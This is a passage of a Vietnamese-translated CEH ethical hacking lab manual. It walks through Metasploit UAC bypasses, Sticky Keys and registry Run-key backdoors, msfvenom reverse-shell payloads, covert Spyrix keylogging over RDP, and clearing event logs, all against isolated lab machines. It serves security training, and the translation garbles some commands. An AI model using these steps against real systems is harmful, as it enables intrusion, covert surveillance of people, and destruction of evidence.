16. Điều hướng đến thư mục Tải xuống và nhấp đúp vào tệp Windows.exe.

> Nếu cửa sổ Mở tệp - Cảnh báo bảo mật xuất hiện; nhấp vào Chạy.

17. Để máy Windows 11 chạy và nhấp vào Bảo mật Parrot để chuyển sang máy Bảo mật Parrot.[Parrot Security](https://labclient.labondemand.com/Instructions/9bd79016-86f2-4ae3-aefe-7c1241c9ac02)

18. Phiên Meterpreter đã được mở thành công, như trong ảnh chụp màn hình.

19. Nhập sysinfo và nhấn Enter. Việc đưa ra lệnh này sẽ hiển thị thông tin máy mục tiêu như tên máy tính, hệ điều hành và miền.

20. Nhập getuid và nhấn Enter để hiển thị ID người dùng hiện tại.

21. Bây giờ, chúng tôi sẽ cố gắng bỏ qua cài đặt kiểm soát tài khoản người dùng đang chặn bạn truy cập không hạn chế vào máy.

22. Nhập nền và nhấn Enter để làm nền cho phiên hiện tại.

23. Nhập tìm kiếm bypassuac và nhấn Enter để nhận danh sách các mô-đun bypassuac.

> Trong nhiệm vụ này, chúng tôi sẽ bỏ qua tính năng bảo vệ UAC của Windows thông qua Khóa đăng ký FodHelper. Nó hiện diện trong Metasploit dưới dạng khai thác bypassuac_fodhelper.

24. Trong cửa sổ terminal, nhập sử dụng khai thác/windows/local/bypassuac_fodhelper rồi nhấn Enter.

25. Nhập đặt phiên 1 và nhấn Enter.

26. Nhập hiển thị các tùy chọn trong bảng điều khiển của máy đo và nhấn Enter.

27. Để đặt tùy chọn LHOST , hãy nhập đặt LHOST 10.10.1.13 và nhấn Enter.

28. Để đặt tùy chọn MỤC TIÊU, hãy nhập đặt MỤC TIÊU 0 và nhấn Enter (ở đây, 0 không biểu thị gì ngoài ID mục tiêu khai thác).

29. Nhập khai thác và nhấn Enter để bắt đầu khai thác trên máy Windows 11.

30. Khai thác BypassUAC đã vượt qua thành công cài đặt UAC trên máy Windows 11.

31. Nhập getsystem -t 1 và nhấn Enter để nâng cao đặc quyền.

32. Bây giờ, hãy nhập getuid và nhấn Enter. Phiên đo lường hiện đang chạy với các đặc quyền hệ thống.

33. Nhập nền và nhấn Enter để làm nền cho phiên hiện tại.

> Trong nhiệm vụ này, chúng ta sẽ sử dụng mô-đun Sticky_keys có trong Metasploit để khai thác tính năng Sticky Keys trong Windows 11.

34. Nhập sử dụng bài đăng/windows/quản lý/sticky_keys và nhấn Enter.

35. Bây giờ, hãy nhập sessions -i\* và nhấn Enter để liệt kê các phiên trong Meterpreter.

36. Trong loại bảng điều khiển đặt phiên 2 để đặt phiên đặc quyền làm phiên hiện tại.

37. Trong bảng điều khiển, hãy nhập khai thác và nhấn Enter để bắt đầu khai thác.

38. Bây giờ, hãy nhấp vào Windows 11 để chuyển sang máy Windows 11 và đăng xuất khỏi tài khoản Quản trị viên rồi đăng nhập vào tài khoản Martin bằng cách sử dụng táo làm mật khẩu.[Windows 11](https://labclient.labondemand.com/Instructions/9bd79016-86f2-4ae3-aefe-7c1241c9ac02)

39. Martin là tài khoản người dùng không có bất kỳ đặc quyền quản trị viên nào, khóa hệ thống và từ màn hình khóa nhấn phím Shift 5 lần, thao tác này sẽ mở một dấu nhắc lệnh trên màn hình khóa với đặc quyền Hệ thống thay vì cửa sổ lỗi phím dính.

40. Trong cửa sổ Dấu nhắc Lệnh, nhập whoami và nhấn Enter.

41. Chúng ta có thể thấy rằng chúng ta đã có được quyền truy cập liên tục ở cấp Hệ thống vào hệ thống đích bằng cách khai thác các phím dính.

42. Điều này kết thúc phần trình diễn khả năng duy trì tính bền bỉ bằng cách khai thác Sticky Keys.

43. Đóng tất cả các cửa sổ đang mở và ghi lại tất cả thông tin thu được.

44. Đăng xuất khỏi tài khoản Martin và đăng nhập vào tài khoản Quản trị viên bằng cách sử dụng Pa\$\$w0rd làm mật khẩu.

45. Nhấp vào Bảo mật vẹt để chuyển sang máy Bảo mật vẹt và khởi động lại máy. Để làm điều đó, hãy nhấp vào nút Trình đơn ở dưới cùng bên trái của Màn hình, từ trình đơn và nhấp vào biểu tượng Tắt thiết bị. A Tắt hệ thống này ngay bây giờ? cửa sổ bật lên xuất hiện, hãy nhấp vào nút Khởi động lại.[Parrot Security](https://labclient.labondemand.com/Instructions/9bd79016-86f2-4ae3-aefe-7c1241c9ac02)

**Câu 6.2.1.1**

Khai thác tính năng Sticky Keys để giành quyền truy cập và nâng cao đặc quyền trên máy Windows 11. Nhập miền của Windows 11 thu được từ lệnh sysinfo trong phiên métpreter.

Lab 3: Duy trì quyền truy cập từ xa và ẩn các hoạt động độc hại

**Kịch bản bài lab**

Với tư cách là một hacker có đạo đức chuyên nghiệp hoặc chuyên gia kiểm thử xâm nhập (pentester), bước tiếp theo sau khi có được quyền truy cập và leo thang đặc quyền trên hệ thống mục tiêu là duy trì quyền truy cập để khai thác thêm trên hệ thống mục tiêu.

Giờ đây, bạn có thể thực thi từ xa các ứng dụng độc hại như keylogger, phần mềm gián điệp, cửa hậu và các chương trình độc hại khác để duy trì quyền truy cập vào hệ thống mục tiêu. Bạn có thể ẩn các chương trình hoặc tệp độc hại bằng các phương pháp như rootkit, steganography và luồng dữ liệu NTFS để duy trì quyền truy cập vào hệ thống đích.

Việc duy trì quyền truy cập sẽ giúp bạn xác định các lỗi bảo mật trong hệ thống mục tiêu và giám sát hoạt động máy tính của nhân viên để kiểm tra xem có vi phạm chính sách bảo mật của công ty hay không. Điều này cũng sẽ giúp dự đoán tính hiệu quả của các biện pháp bảo mật bổ sung trong việc tăng cường và bảo vệ các tài nguyên và hệ thống thông tin khỏi bị tấn công.

**Mục tiêu bài lab**

-   Giám sát và giám sát hệ thống người dùng bằng Spyrix

-   Duy trì tính bền bỉ bằng cách sửa đổi các khóa chạy sổ đăng ký

**Tổng quan về truy cập từ xa và ẩn các hoạt động độc hại**

**Truy cập từ xa: Các kỹ thuật thực thi mã từ xa thường được thực hiện sau khi xâm phạm hệ thống ban đầu và mở rộng quyền truy cập hơn nữa vào các hệ thống từ xa có trên mạng mục tiêu.**

Thảo luận dưới đây là một số kỹ thuật thực thi mã từ xa:

-   Khai thác để thực thi client

-   Nhiệm vụ theo lịch trình

-   Thực hiện dịch vụ

**Ẩn tệp: Ẩn tệp là quá trình ẩn các chương trình độc hại bằng cách sử dụng các phương pháp như rootkit, luồng NTFS và kỹ thuật steganography để ngăn các chương trình độc hại bị phát hiện bởi các ứng dụng bảo vệ như ứng dụng Chống vi-rút, Chống phần mềm độc hại và Chống phần mềm gián điệp có thể được cài đặt trên hệ thống đích. Điều này giúp duy trì quyền truy cập trong tương lai vào hệ thống đích vì một tệp độc hại ẩn cung cấp quyền truy cập trực tiếp vào hệ thống đích mà không cần sự đồng ý của nạn nhân.**

Nhiệm vụ 1: Giám sát và giám sát hệ thống người dùng bằng Spyrix

Spyrix tạo điều kiện giám sát bí mật các hoạt động của người dùng từ xa trong thời gian thực. Nó cung cấp khả năng giám sát ẩn thông qua tài khoản web an toàn, ghi lại các lần nhấn phím bằng keylogger, giám sát các nền tảng khác nhau như Facebook, WhatsApp, Skype, Email, v.v. Nó cũng cung cấp chức năng chụp ảnh màn hình, xem trực tiếp nguồn cấp dữ liệu màn hình và webcam, ghi liên tục hoạt động của màn hình và webcam.

Ở đây, chúng ta sẽ sử dụng Spyrix để thực hiện việc theo dõi, giám sát hệ thống.

1.  Nhấp vào Windows Server 2022 để chuyển sang máy Windows Server 2022 , nhấp vào Ctrl+Alt+Delete để kích hoạt máy và đăng nhập bằng CEH\\Administrator / Pa\$\$w0rd.[Windows Server 2022](https://labclient.labondemand.com/Instructions/9bd79016-86f2-4ae3-aefe-7c1241c9ac02)

2.  Trên máy Windows Server 2022, hãy điều hướng đến Z:\\CEHv13 Mô-đun 06 System Hacking\\Spyware\\General Spyware\\Spyrix và nhấp đúp vào spm_setup.exe.

3.  Làm theo các bước hướng dẫn của trình hướng dẫn để cài đặt Spyrix Personal Monitor.

> Trong Chào mừng bạn đến với Trình hướng dẫn thiết lập Spyrix Personal Monitor 11.6.15, hãy để trống trường Nhập email và nhấp vào Tiếp theo.

4.  Khi kết thúc quá trình cài đặt, hãy đảm bảo rằng hộp kiểm Đăng nhập tài khoản Giám sát trực tuyến của bạn đã được chọn và nhấp vào Hoàn tất.

5.  Trong phần Bạn muốn mở cái này bằng cách nào? cửa sổ bật lên xuất hiện, hãy chọn Firefox từ danh sách và nhấp vào OK.

> Nếu trang web Spyix xuất hiện trong trình duyệt Microsoft Edge, thì hãy tiếp tục trong trình duyệt Edge.
>
> Trong Trình hướng dẫn cài đặt - Màn hình cá nhân Spyrix nhấp vào Bỏ qua Trình hướng dẫn, nhấp vào Đóng trong cửa sổ tiếp theo và đóng cửa sổ Giám sát cá nhân Spyrix.

6.  Trang web Spyrix xuất hiện, nhấp vào Đăng ký để đăng ký tài khoản mới.

7.  Trong trang web Đăng ký tài khoản, hãy nhập địa chỉ email và mật khẩu rồi nhấp vào Đăng ký.

8.  Trang web Spyrix Personal Monitor xuất hiện, thu nhỏ cửa sổ.

9.  Bây giờ, hãy nhấp vào trường Nhập vào đây để tìm kiếm trên Máy tính để bàn, tìm kiếm Từ xa và nhấp vào Kết nối máy tính từ xa từ kết quả.

10. Cửa sổ Kết nối máy tính từ xa xuất hiện. Trong trường Máy tính, nhập địa chỉ IP của hệ thống đích (tại đây, 10.10.1.19 \[Windows Server 2019\]) và nhấp vào Hiển thị tùy chọn.

11. Trong trường Tên người dùng, hãy nhập Jason và nhấp vào Kết nối.

12. Trong cửa sổ bật lên Bảo mật Windows , hãy nhập mật khẩu là qwerty và nhấp vào OK.

> Ở đây, chúng tôi đang sử dụng thông tin xác thực của người dùng hệ thống đích thu được từ bài lab trước.

13. Cửa sổ Kết nối máy tính từ xa xuất hiện; nhấp vào Có.

> Bạn không thể truy cập máy mục tiêu từ xa nếu hệ thống tắt. Quá trình này chỉ có thể thực hiện được nếu máy được bật.

14.  Kết nối máy tính từ xa được thiết lập thành công, như minh họa trong ảnh chụp màn hình.

> Màn hình Mạng xuất hiện, hãy nhấp vào Có để cho phép các PC và thiết bị khác trên mạng có thể phát hiện ra PC của bạn.

15. Thu nhỏ cửa sổ Kết nối máy tính từ xa.

> Nếu cửa sổ Trình quản lý máy chủ xuất hiện, hãy đóng nó lại.

16. Điều hướng đến Z:\\CEHv13 Mô-đun 06 System Hacking\\Spyware\\General Spyware\\Spyrix và sao chép spm_setup.exe.

17. Chuyển sang cửa sổ Kết nối máy tính từ xa và dán tệp spm_setup.exe trên Máy tính để bàn của hệ thống đích.

18. Nhấp đúp vào tệp spm_setup.exe.

> Nếu cửa sổ bật lên Kiểm soát tài khoản người dùng xuất hiện, hãy nhấp vào Có.

19. Trong cửa sổ bật lên Chọn ngôn ngữ thiết lập, hãy nhấp vào OK. Trong Chào mừng bạn đến với Trình hướng dẫn thiết lập Spyrix Personal Monitor 11.6.15, hãy nhập địa chỉ email mà bạn đã nhập khi đăng ký Spyrix ở Bước#7 và nhấp vào Tiếp theo.

20. Làm theo các bước hướng dẫn của trình hướng dẫn để cài đặt Spyrix Personal Monitor. Trong cửa sổ cuối cùng, bỏ chọn hộp kiểm Đăng nhập tài khoản Giám sát trực tuyến của bạn và nhấp vào Hoàn tất.

21. Xóa thiết lập Spyrix (spm_setup.exe) khỏi Máy tính để bàn.

22. Đóng Kết nối máy tính từ xa bằng cách nhấp vào biểu tượng đóng (X).

> Nếu cửa sổ bật lên Kết nối máy tính từ xa xuất hiện cho biết Phiên từ xa của bạn sẽ bị ngắt kết nối, hãy nhấp vào OK.

23. Bây giờ, hãy phóng to cửa sổ trình duyệt, Cửa sổ máy tính mới đã được kết nối xuất hiện, hãy đóng cửa sổ bật lên.

24. Bây giờ, hãy nhấp vào Windows Server 2019 để chuyển sang máy Windows Server 2019. Nhấp vào Ctrl+Alt+Delete, nhấp vào Jason từ ngăn bên trái và đăng nhập bằng mật khẩu qwerty.[Windows Server 2019](https://labclient.labondemand.com/Instructions/9bd79016-86f2-4ae3-aefe-7c1241c9ac02)

> Ở đây, chúng ta đang chạy máy mục tiêu với tư cách là người dùng hợp pháp.

25. Mở bất kỳ trình duyệt web nào (ở đây, chúng tôi đang sử dụng Google Chrome) và duyệt bất kỳ trang web nào.

> Trong nhiệm vụ này, chúng ta đang duyệt qua Gmail.

26. Sau khi bạn đã thực hiện một số hoạt động của người dùng, hãy để nguyên máy và nhấp vào Windows Server 2022 để chuyển sang máy Windows Server 2022.[Windows Server 2022](https://labclient.labondemand.com/Instructions/9bd79016-86f2-4ae3-aefe-7c1241c9ac02)

> Nếu cửa sổ Trình quản lý máy chủ xuất hiện, hãy đóng nó lại.

27. Trong máy Windows Server 2022, hãy tối đa hóa cửa sổ trình duyệt Firefox và tải lại trang web Spyrix Personal Monitor.

28. Nhấp vào Tóm tắt để xem các sự kiện do Jason thực hiện trên máy Windows Server 2019.

> Nếu biểu tượng lịch màu đen xuất hiện, hãy tải lại trang.

29. Điều hướng đến Hoạt động của người dùng từ ngăn bên trái để xem hoạt động của người dùng trên máy Windows Server 2019.

> Nếu biểu tượng lịch màu đen xuất hiện, hãy tải lại trang.

30. Nhấp vào Ảnh chụp màn hình để xem ảnh chụp màn hình được chụp từ máy mục tiêu.

31. Nhấp vào Các trang web đã truy cập để xem các trang web đã được Jason truy cập trên máy Windows Server 2019.

32. Nhấp vào Sự kiện bàn phím để xem các lần nhấn phím được ghi lại từ máy mục tiêu.

33. Nhấp vào Nhật ký sự kiện để xem các sự kiện. Trong trang Nhật ký sự kiện, hãy nhấp vào Tất cả sự kiện để xem tất cả các sự kiện đã xảy ra trong máy mục tiêu.

34. Nhấp vào Xem trực tiếp để xem màn hình trực tiếp của máy mục tiêu.

35. Nhấp vào phần Báo cáo và nhấp vào + Yêu cầu báo cáo mới để tạo báo cáo.

36. Trong cửa sổ Yêu cầu báo cáo mới , hãy nhấp vào hộp văn bản bên dưới tùy chọn Chọn khoảng thời gian. Trong lịch, hãy giữ ngày ở chế độ mặc định và nhấp vào OK.

37. Sau khi chọn ngày, hãy nhấp vào nút Yêu cầu báo cáo thông minh.

38. Báo cáo sẽ bắt đầu tạo sau vài giây tải lại trang bằng cách nhấp vào tùy chọn tải lại bên cạnh nút + Yêu cầu báo cáo mới.

39. Sau khi trạng thái thay đổi từ Đang chạy sang Sẵn sàng, hãy nhấp vào Tải xuống để tải xuống Báo cáo thông minh.

40. Sau khi tải xuống hoàn tất, bạn sẽ thấy một tệp zip. Giải nén tệp và điều hướng đến thư mục báo cáo và nhấp đúp vào tệp report.html.

> Nếu bạn muốn mở tệp này bằng cách nào? cửa sổ bật lên xuất hiện, hãy chọn Firefox từ danh sách và nhấp vào OK.

41. Báo cáo SPYRIX sẽ xuất hiện hiển thị tất cả ảnh chụp màn hình, hoạt động của Chương trình, hoạt động trên Bàn phím, URL, v.v.

42. Đóng tất cả các cửa sổ đang mở trên cả hai máy và đăng xuất khỏi tài khoản Jason trên máy Windows Server 2019.

43. Phần này kết thúc phần trình diễn cách thực hiện giám sát và giám sát hệ thống người dùng bằng Spyrix.

44. Bây giờ, trước khi tiếp tục nhiệm vụ tiếp theo, hãy hoàn nguyên các máy Windows Server 2019 , Windows Server 2022 về trạng thái ban đầu. Để thực hiện việc này, hãy nhấp vào nút Nguồn và Hiển thị và chọn tùy chọn Hoàn nguyên máy từ danh sách thả xuống như minh họa trong ảnh chụp màn hình.[Windows Server 2019Windows Server 2022](https://labclient.labondemand.com/Instructions/9bd79016-86f2-4ae3-aefe-7c1241c9ac02)

> Nếu tùy chọn Hoàn nguyên máy không hoạt động, hãy kết thúc lab và khởi chạy lại để đặt lại máy. Để làm như vậy, hãy nhấp vào tùy chọn Thoát bài lab và nhấp vào Kết thúc bài lab từ các tùy chọn thả xuống.
>
> Trước khi khởi động lại lab, bạn nên lưu tất cả các câu trả lời thu được. Bạn có thể tiếp tục nhiệm vụ tiếp theo bằng cách đặt tất cả các câu trả lời vào lá cờ tương ứng của chúng.

**Câu 6.3.1.1**

Sử dụng Spyrix Personal Monitor trên máy Windows Server 2022 để giám sát máy mục tiêu tại 10.10.1.19. Sử dụng tài khoản người dùng Jason, với mật khẩu qwerty, để thiết lập Kết nối máy tính từ xa với hệ thống đích. Nhập tên của máy mục tiêu sẽ hiển thị trong bảng điều khiển Spyrix Personal Monitor.

![](media/image87.wmf)

Nhiệm vụ 2: Duy trì tính ổn định bằng cách sửa đổi khóa chạy sổ đăng ký

Các khóa đăng ký được gắn nhãn là Run và RunOnce được tạo để tự động chạy các chương trình khi mỗi người dùng đăng nhập vào hệ thống. Dòng lệnh được chỉ định làm giá trị dữ liệu của khóa bị giới hạn ở 260 ký tự trở xuống. Nếu kẻ tấn công phát hiện ra một dịch vụ được kết nối với khóa đăng ký có đầy đủ quyền, chúng có thể thực hiện các cuộc tấn công liên tục hoặc khai thác việc leo thang đặc quyền. Khi bất kỳ nỗ lực đăng nhập nào của người dùng được ủy quyền, liên kết dịch vụ liên quan trong sổ đăng ký sẽ tự động kích hoạt.

Tại đây, chúng tôi sẽ khai thác các khóa Sổ đăng ký để có được quyền truy cập đặc quyền và tính ổn định trên máy mục tiêu.

1.  Nhấp vào Bảo mật Vẹt để chuyển sang máy Bảo mật Vẹt và đăng nhập bằng kẻ tấn công/toor.[Parrot Security](https://labclient.labondemand.com/Instructions/9bd79016-86f2-4ae3-aefe-7c1241c9ac02)

2.  Mở cửa sổ terminal / dòng lệnh và thực thi sudo su để chạy các chương trình với tư cách là người dùng root (Khi được nhắc, hãy nhập mật khẩu). Chạy lệnh cd để chuyển đến thư mục gốc.

3.  Chạy lệnh msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.1.13 lport=444 -f exe \> /home/Attacker/Desktop/Test.exe để tạo tải trọng Test.exe.

4.  Bây giờ, chúng ta sẽ tạo tải trọng cần tải lên Run Register của máy Windows 11. Chạy lệnh sau:

> **msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.1.13 lport=4444 -f exe \> /home/Attacker/Desktop/registry.exe**

5.  Trong lab trước, chúng ta đã tạo một thư mục hoặc thư mục dùng chung (chia sẻ) tại vị trí (/var/www/html) với quyền truy cập được yêu cầu. Vì vậy, chúng ta sẽ sử dụng cùng thư mục hoặc thư mục dùng chung (share) để chia sẻ mining.exe với máy nạn nhân.

> Để tạo một thư mục mới nhằm chia sẻ các tệp Test.exe và registry.exe với máy mục tiêu và cung cấp các quyền, hãy sử dụng các lệnh bên dưới:

-   Chạy lệnh mkdir /var/www/html/share để tạo thư mục dùng chung

-   Chạy chmod -R 755 /var/www/html/share lệnh

-   Chạy chown -R www-data:www-data /var/www/html/share command

6.  Sao chép tải trọng vào thư mục dùng chung bằng cách thực thi các lệnh cp /home/Attacker/Desktop/Test.exe /var/www/html/share/ và cp /home/Attacker/Desktop/registry.exe /var/www/html/share/.

7.  Khởi động máy chủ Apache bằng cách chạy lệnh khởi động dịch vụ apache2.

8.  Chạy lệnh msfconsole để khởi chạy Metasploit Framework.

9.  Trong Metasploit, nhập sử dụng khai thác/đa/trình xử lý và nhấn Enter.

10. Bây giờ, hãy nhập đặt cửa sổ tải trọng/meterpreter/reverse_tcp và nhấn Enter.

11. Nhập đặt lhost 10.10.1.13 và nhấn Enter để đặt lhost.

12. Nhập đặt lport 444 và nhấn Enter để đặt lport.

13. Bây giờ, hãy nhập chạy trong bảng điều khiển Metasploit và nhấn Enter.

14. Nhấp vào Windows 11 để chuyển sang máy Windows 11 , nhấp vào Ctrl+Alt+Delete để kích hoạt máy và đăng nhập bằng Admin/Pa\$\$w0rd..[Windows 11](https://labclient.labondemand.com/Instructions/9bd79016-86f2-4ae3-aefe-7c1241c9ac02)

15. Mở bất kỳ trình duyệt web nào (ở đây, Mozilla Firefox), truy cập http://10.10.1.13/share. Ngay khi bạn nhấn enter, nó sẽ hiển thị nội dung thư mục dùng chung.

16. Nhấp vào Test.exe và registry.exe để tải tệp xuống.

17. Điều hướng đến Tải xuống và nhấp đúp vào tệp Test.exe.

> Nếu cửa sổ Mở tệp - Cảnh báo bảo mật xuất hiện; nhấp vào Chạy.

18. Để máy Windows 11 chạy và nhấp vào Bảo mật Parrot để chuyển sang máy Bảo mật Parrot.[Parrot Security](https://labclient.labondemand.com/Instructions/9bd79016-86f2-4ae3-aefe-7c1241c9ac02)

19. Phiên đo đã được mở thành công.

20. Nhập getuid và nhấn Enter để hiển thị ID người dùng hiện tại.

21. Bây giờ, chúng tôi sẽ cố gắng bỏ qua cài đặt Kiểm soát tài khoản người dùng đang chặn bạn truy cập không hạn chế vào máy.

22. Nhập nền và nhấn Enter để làm nền cho phiên hiện tại.

> Trong tác vụ này, chúng tôi sẽ bỏ qua tính năng bảo vệ UAC của Windows thông qua tác vụ SilentCleanup có trong Bộ lập lịch tác vụ Windows. Nó hiện diện trong Metasploit dưới dạng khai thác bypassuac_silentcleanup.

23. Trong cửa sổ terminal, nhập sử dụng khai thác/windows/local/bypassuac_silentcleanup và nhấn Enter.

24. Bây giờ, hãy nhập đặt phiên 1 và nhấn Enter.

25. Nhập hiển thị các tùy chọn trong bảng điều khiển của máy đo và nhấn Enter.

26. Để đặt tùy chọn LHOST , hãy nhập đặt LHOST 10.10.1.13 và nhấn Enter.

27. Để đặt tùy chọn MỤC TIÊU, hãy nhập đặt MỤC TIÊU 0 và nhấn Enter (ở đây, 0 không biểu thị gì ngoài ID mục tiêu khai thác).

28. Nhập khai thác và nhấn Enter để bắt đầu khai thác trên máy Windows 11.

> Nếu bạn nhận được thông báo khai thác hoàn tất nhưng không có phiên nào được tạo mà không có phiên nào, hãy nhập lại khai thác trong bảng điều khiển và nhấn Enter.

29. Khai thác BypassUAC đã vượt qua thành công cài đặt UAC trên máy Windows 11.

30. Nhập getsystem -t 1 và nhấn Enter để nâng cao đặc quyền.

31. Bây giờ, hãy nhập getuid và nhấn Enter. Phiên Meterpreter hiện đang chạy với các đặc quyền hệ thống.

32. Bây giờ, để thêm tệp độc hại vào sổ đăng ký của máy Windows 11, hãy mở shell bằng cách chạy lệnh shell.

33. Trong shell nâng cao, nhập reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v backdoor /t REG_EXPAND_SZ /d \"C:\\Users\\Admin\\Downloads\\registry.exe\" rồi nhấn Enter.

34. Sau khi lệnh được thực thi thành công, hãy mở một cửa sổ terminal khác có quyền root và chạy lệnh msfconsole.

35. Trong Metasploit, nhập sử dụng khai thác/đa/trình xử lý và nhấn Enter.

36. Bây giờ, hãy nhập đặt cửa sổ tải trọng/meterpreter/reverse_tcp và nhấn Enter.

37. Nhập đặt lhost 10.10.1.13 và nhấn Enter để đặt lhost.

38. Nhập đặt lport 4444 và nhấn Enter để đặt lport.

39. Bây giờ, hãy nhập khai thác để bắt đầu khai thác.

40. Nhấp vào Windows 11 để chuyển sang máy Windows 11 đăng nhập vào tài khoản Quản trị viên và khởi động lại máy để tệp độc hại đặt trong Sổ đăng ký chạy được thực thi.[Windows 11](https://labclient.labondemand.com/Instructions/9bd79016-86f2-4ae3-aefe-7c1241c9ac02)

41. Bây giờ, hãy nhấp vào Bảo mật Parrot để chuyển sang máy Bảo mật Parrot và bạn có thể thấy phiên máy đo đã được mở.[Parrot Security](https://labclient.labondemand.com/Instructions/9bd79016-86f2-4ae3-aefe-7c1241c9ac02)

> Phải mất một thời gian để phiên mở.

42. Nhập getuid và nhấn Enter, chúng ta có thể thấy rằng chúng ta đã mở một shell đảo ngược với đặc quyền của quản trị viên.

43. Bất cứ khi nào Quản trị viên khởi động lại hệ thống, một shell đảo ngược sẽ được mở cho kẻ tấn công cho đến khi quản trị viên phát hiện được tải trọng.

44. Do đó, kẻ tấn công có thể duy trì sự tồn tại lâu dài trên máy mục tiêu bằng cách sử dụng khóa Run Register.

45. Phần này kết thúc phần minh họa cách duy trì tính bền bỉ bằng cách Sửa đổi Khóa chạy Sổ đăng ký.

46. Đóng tất cả các cửa sổ đang mở và ghi lại tất cả thông tin thu được.

47. Bây giờ, trước khi tiếp tục nhiệm vụ tiếp theo, hãy hoàn nguyên các máy Parrot Security , Windows 11 về trạng thái ban đầu. Để thực hiện việc này, hãy nhấp vào nút Nguồn và Hiển thị và chọn tùy chọn Hoàn nguyên máy từ danh sách thả xuống như minh họa trong ảnh chụp màn hình.[Parrot SecurityWindows 11](https://labclient.labondemand.com/Instructions/9bd79016-86f2-4ae3-aefe-7c1241c9ac02)

> Nếu tùy chọn Hoàn nguyên máy không hoạt động, hãy kết thúc lab và khởi chạy lại để đặt lại máy. Để làm như vậy, hãy nhấp vào tùy chọn Thoát bài lab và nhấp vào Kết thúc bài lab từ các tùy chọn thả xuống.
>
> Trước khi khởi động lại lab, bạn nên lưu tất cả các câu trả lời thu được. Bạn có thể tiếp tục nhiệm vụ tiếp theo bằng cách đặt tất cả các câu trả lời vào lá cờ tương ứng của chúng.

**Câu 6.3.2.1**

Sử dụng máy Parrot Security để có quyền truy cập và khai thác các khóa Sổ đăng ký để có được quyền truy cập đặc quyền và tính ổn định trên máy Windows 11. Nhập đường dẫn đăng ký của hệ thống đích nơi tệp .exe cửa sau được thêm vào để duy trì tính bền vững của Sổ đăng ký trong tác vụ này.

Lab 4: Xóa nhật ký để che giấu bằng chứng thỏa hiệp

**Kịch bản bài lab**

Trong các bài thực hành trước, bạn đã thấy các bước khác nhau mà kẻ tấn công thực hiện trong vòng đời tấn công hệ thống. Họ bắt đầu bằng việc giành quyền truy cập vào hệ thống, nâng cao đặc quyền, thực thi các ứng dụng độc hại và ẩn các tệp. Tuy nhiên, để duy trì quyền truy cập vào hệ thống mục tiêu lâu hơn và tránh bị phát hiện, chúng cần xóa mọi dấu vết xâm nhập của chúng. Điều cần thiết là phải tránh truy nguyên và có thể bị truy tố vì hành vi hack.

Bước cuối cùng của một hacker có đạo đức chuyên nghiệp và người kiểm tra thâm nhập trong quá trình hack hệ thống là xóa mọi dấu vết hoặc dấu vết xâm nhập trên hệ thống mục tiêu. Một trong những kỹ thuật chính để đạt được mục tiêu này là thao tác, vô hiệu hóa hoặc xóa nhật ký hệ thống. Khi bạn có quyền truy cập vào hệ thống đích, bạn có thể sử dụng các tiện ích hệ thống sẵn có để vô hiệu hóa hoặc giả mạo cơ chế ghi nhật ký và kiểm tra trong hệ thống đích.

Tác vụ này sẽ minh họa cách xóa, thao tác, vô hiệu hóa hoặc xóa nhật ký hệ thống bằng nhiều phương pháp khác nhau.

**Mục tiêu bài lab**

-   Xóa nhật ký máy Windows bằng nhiều tiện ích khác nhau

-   Xóa nhật ký máy Linux bằng shell BASH

**Tổng quan về việc xóa nhật ký**

Để không bị phát hiện, những kẻ xâm nhập cần xóa tất cả bằng chứng về sự xâm phạm bảo mật khỏi hệ thống. Để đạt được điều này, họ có thể sửa đổi hoặc xóa nhật ký trong hệ thống bằng cách sử dụng một số tiện ích xóa nhật ký nhất định, do đó xóa tất cả bằng chứng về sự hiện diện của chúng.

Các kỹ thuật khác nhau được sử dụng để xóa bằng chứng về sự xâm phạm an ninh như sau:

-   **Vô hiệu hóa kiểm tra: Vô hiệu hóa các tính năng kiểm tra của hệ thống đích**

-   **Clearing Logs: Xóa và xóa các mục nhật ký hệ thống tương ứng với các hoạt động xâm phạm bảo mật**

-   **Thao tác nhật ký: Thao tác nhật ký theo cách mà kẻ xâm nhập sẽ không bị bắt vì các hành động bất hợp pháp**

-   **Che dấu vết trên mạng: Sử dụng các kỹ thuật như vỏ HTTP đảo ngược, đường hầm ICMP đảo ngược, đường hầm DNS và tham số TCP để che dấu vết trên mạng.**

-   **Che dấu vết trên hệ điều hành: Sử dụng luồng NTFS để ẩn và che các tệp độc hại trong hệ thống đích**

-   **Xóa tệp: Sử dụng các công cụ dòng lệnh như Cipher.exe để xóa dữ liệu và ngăn chặn việc khôi phục dữ liệu trong tương lai**

-   **Vô hiệu hóa chức năng của Windows: Vô hiệu hóa chức năng của Windows như dấu thời gian truy cập lần cuối, Ngủ đông, bộ nhớ ảo và các điểm khôi phục hệ thống để che dấu vết**

Nhiệm vụ 1: Xóa nhật ký máy Windows bằng nhiều tiện ích khác nhau

Tệp nhật ký hệ thống chứa các sự kiện được ghi lại bởi các thành phần hệ điều hành. Những sự kiện này thường được xác định trước bởi chính hệ điều hành. Tệp nhật ký hệ thống có thể chứa thông tin về các thay đổi của thiết bị, trình điều khiển thiết bị, thay đổi hệ thống, sự kiện, hoạt động và các thay đổi khác.

Có nhiều tiện ích Windows khác nhau có thể được sử dụng để xóa nhật ký hệ thống như Clear_Event_Viewer_Logs.bat, wevtutil và Cipher. Ở đây, chúng tôi sẽ sử dụng các tiện ích này để xóa nhật ký máy Windows.

1.  Trong máy Windows 11, hãy điều hướng đến E:\\CEH-Tools\\CEHv13 Mô-đun 06 System Hacking\\Covering Tracks Tools\\Clear_Event_Viewer_Logs.bat. Nhấp chuột phải vào Clear_Event_Viewer_Logs.bat và nhấp vào Chạy với tư cách quản trị viên.

2.  Cửa sổ bật lên Kiểm soát tài khoản người dùng xuất hiện; nhấp vào Có.

3.  Cửa sổ Dấu nhắc Lệnh xuất hiện và tiện ích bắt đầu xóa nhật ký sự kiện, như minh họa trong ảnh chụp màn hình. Dấu nhắc lệnh sẽ tự động đóng khi hoàn tất.

> Clear_Event_Viewer_Logs.bat là một tiện ích có thể được sử dụng để xóa nhật ký của hệ thống đích. Tiện ích này có thể chạy thông qua dấu nhắc lệnh hoặc PowerShell và nó sử dụng tệp BAT để xóa nhật ký bảo mật, hệ thống và ứng dụng trên hệ thống đích. Bạn có thể sử dụng tiện ích này để xóa nhật ký như một phương pháp che dấu vết của bạn trên hệ thống đích.
>
> thêm\...

4.  Trong loại tìm kiếm của Windows cmd dấu nhắc lệnh xuất hiện trong kết quả, hãy nhấp vào Chạy với tư cách quản trị viên để khởi chạy.

